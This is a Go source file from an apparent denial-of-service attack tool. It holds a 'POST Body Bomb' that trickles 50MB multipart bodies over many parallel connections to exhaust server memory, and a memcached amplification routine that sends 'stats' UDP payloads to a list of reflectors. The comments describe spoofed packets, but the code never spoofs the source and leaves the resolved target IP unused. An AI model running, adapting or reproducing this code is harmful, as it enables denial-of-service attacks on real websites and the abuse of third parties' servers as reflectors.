package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// POST Body Bomb
// Send POST requests with massive multipart body
// Forces server to allocate memory for parsing

func runPostBomb(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	target := cfg.Target
	host := target
	port := "443"
	useTLS := true
	path := "/"

	if u, err := url.Parse(target); err == nil && u.Hostname() != "" {
		host = u.Hostname()
		if u.Port() != "" {
			port = u.Port()
		} else if u.Scheme == "http" {
			port = "80"
			useTLS = false
		}
		path = u.Path
		if path == "" {
			path = "/"
		}
	}

	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	connCount := cfg.Threads
	if connCount < 50 {
		connCount = 100
	}

	log.Printf("POST Bomb: %d parallel connections to %s:%s%s", connCount, host, port, path)

	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("PostBomb worker %d recovered: %v", id, r)
				}
			}()

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}

				err := postBombConn(host, port, path, useTLS, deadline)
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
					time.Sleep(100 * time.Millisecond)
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func postBombConn(host, port, path string, useTLS bool, deadline time.Time) error {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	rawConn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}

	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	var conn net.Conn = rawConn
	if useTLS {
		tlsConn := tls.Client(rawConn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
		})
		tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return fmt.Errorf("handshake: %w", err)
		}
		tlsConn.SetDeadline(time.Time{})
		conn = tlsConn
	}
	defer conn.Close()

	boundary := fmt.Sprintf("----WebKitFormBoundary%d", time.Now().UnixNano())

	// Build a HUGE multipart body
	bodySize := 50 * 1024 * 1024 // 50MB body
	contentLength := bodySize

	header := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Content-Type: multipart/form-data; boundary=%s\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"Cache-Control: no-cache\r\n"+
			"\r\n",
		path, host, randomUA(), boundary, contentLength,
	)

	if _, err := conn.Write([]byte(header)); err != nil {
		return err
	}

	// Send body slowly to keep connection occupied
	chunk := make([]byte, 4096)
	for i := range chunk {
		chunk[i] = byte('A' + rand.Intn(26))
	}

	written := 0
	startSend := time.Now()
	for written < contentLength && time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return nil
		}

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		n, err := conn.Write(chunk)
		if err != nil {
			break
		}
		written += n

		atomic.AddInt64(&metrics.TotalRequests, 1)

		// Slow trickle - server holds memory for entire 50MB
		time.Sleep(50 * time.Millisecond)

		if time.Since(startSend) > 60*time.Second {
			break
		}
	}

	atomic.AddInt64(&metrics.Completed, 1)
	return nil
}

// SSDP/Memcached/DNS Amplification (requires reflector list)
// Reads reflector IPs from file and sends spoofed UDP packets
// NOTE: requires raw socket / admin privileges + non-filtered network

func runAmplification(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	if cfg.ProxyFile == "" {
		log.Printf("Amplification needs reflector list (-proxy-file path/to/reflectors.txt)")
		return
	}

	reflectors, err := loadReflectors(cfg.ProxyFile)
	if err != nil {
		log.Printf("Failed to load reflectors: %v", err)
		return
	}
	if len(reflectors) == 0 {
		log.Printf("No reflectors loaded")
		return
	}

	log.Printf("Amplification: %d reflectors targeting %s", len(reflectors), cfg.Target)

	target := cfg.Target
	if u, err := url.Parse(cfg.Target); err == nil && u.Hostname() != "" {
		target = u.Hostname()
	}

	targetIPs, err := net.LookupHost(target)
	if err != nil || len(targetIPs) == 0 {
		log.Printf("Cannot resolve %s", target)
		return
	}
	targetIP := targetIPs[0]
	_ = targetIP

	// Memcached "stats" payload - amplifies 50000x
	memcachedPayload := []byte("\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")

	connCount := cfg.Threads
	if connCount < 10 {
		connCount = 50
	}

	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("Amp worker %d recovered: %v", id, r)
				}
			}()

			conn, err := net.ListenUDP("udp", nil)
			if err != nil {
				log.Printf("UDP listen failed: %v", err)
				return
			}
			defer conn.Close()

			rate := time.NewTicker(time.Second / time.Duration(max(1, cfg.RPS/connCount)))
			defer rate.Stop()

			refIdx := 0
			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				<-rate.C

				ref := reflectors[refIdx%len(reflectors)]
				refIdx++

				addr, err := net.ResolveUDPAddr("udp", ref+":11211")
				if err != nil {
					continue
				}

				_, err = conn.WriteToUDP(memcachedPayload, addr)
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
					continue
				}

				atomic.AddInt64(&metrics.TotalRequests, 1)
				atomic.AddInt64(&metrics.Completed, 1)
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func loadReflectors(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var refs []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		// Strip protocol prefix if present
		line = strings.TrimPrefix(line, "http://")
		line = strings.TrimPrefix(line, "https://")
		// Strip port if present (we'll use default per protocol)
		if idx := strings.Index(line, ":"); idx > 0 {
			line = line[:idx]
		}
		refs = append(refs, line)
	}
	return refs, scanner.Err()
}

var _ = io.EOF
